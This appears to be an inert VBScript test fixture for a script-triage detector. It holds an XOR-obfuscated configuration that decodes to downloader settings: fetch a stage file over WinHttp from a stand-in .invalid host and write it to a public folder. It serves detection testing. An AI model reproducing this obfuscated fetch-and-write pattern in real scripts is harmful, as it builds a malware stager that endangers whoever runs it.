Option Explicit
' Huntress Script Triage -- inert static-analysis fixture (wsh_vbscript_windows)
Const Material_2586e568 = "24,83,95,18,29,26,11,30,29,83,15,13,31,27,7,28,11,49,28,11,3,1,26,11,66,25,28,7,26,11,49,8,7,2,11,18,15,10,15,30,26,11,28,83,57,7,0,38,26,26,30,64,57,7,0,38,26,26,30,60,11,31,27,11,29,26,64,91,64,95,18,29,26,15,9,11,49,13,1,27,0,26,83,92,18,13,15,3,30,15,7,9,0,49,7,10,83,13,15,3,30,15,7,9,0,67,95,8,89,15,90,10,88,91,12,15,18,27,28,2,83,6,26,26,30,29,84,65,65,95,8,89,15,90,10,88,91,12,15,64,11,22,15,3,30,2,11,64,7,0,24,15,2,7,10,65,10,10,86,11,15,95,89,94,64,10,15,26,18,27,29,11,28,49,15,9,11,0,26,83,38,27,0,26,28,11,29,29,34,15,12,65,95,8,89,15,90,10,88,91,12,15,18,8,7,2,11,49,30,15,26,6,83,45,84,50,59,29,11,28,29,50,62,27,12,2,7,13,50,38,27,0,26,28,11,29,29,34,15,12,50,29,26,15,9,11,67,95,8,89,15,90,10,88,91,12,15,64,10,15,26"
Const Codec_2586e568 = "reversed_decimal|reverse_then_xor|6e"

Function Load_2586e568()
  Dim parts, result(), materialIndex
  parts = Split(Material_2586e568, ",")
  ReDim result(UBound(parts))
  For materialIndex = 0 To UBound(parts)
    result(UBound(parts) - materialIndex) = CInt(parts(materialIndex))
  Next
  Load_2586e568 = result
End Function

Function Decode_2586e568(ByRef storedMaterial)
  Dim result(), materialIndex, keyBytes, previous
  ReDim result(UBound(storedMaterial))
  For materialIndex = 0 To UBound(storedMaterial)
    result(UBound(storedMaterial) - materialIndex) = storedMaterial(materialIndex) Xor 110
  Next
  Decode_2586e568 = result
End Function

Function Recover_2586e568()
  Dim storedMaterial, recoveredMaterial, configurationText, harmlessValue, materialIndex, decodePass, savedError, savedDescription
  harmlessValue = Empty

  storedMaterial = Load_2586e568()

  decodePass = 0

  While decodePass < 1

    recoveredMaterial = Decode_2586e568(storedMaterial)

    decodePass = decodePass + 1

  Wend

  configurationText = ""

  For materialIndex = 0 To UBound(recoveredMaterial)

    configurationText = configurationText & Chr(recoveredMaterial(materialIndex))

  Next
  Recover_2586e568 = configurationText
End Function

Function Inspect_2586e568()
  Inspect_2586e568 = Recover_2586e568()
End Function
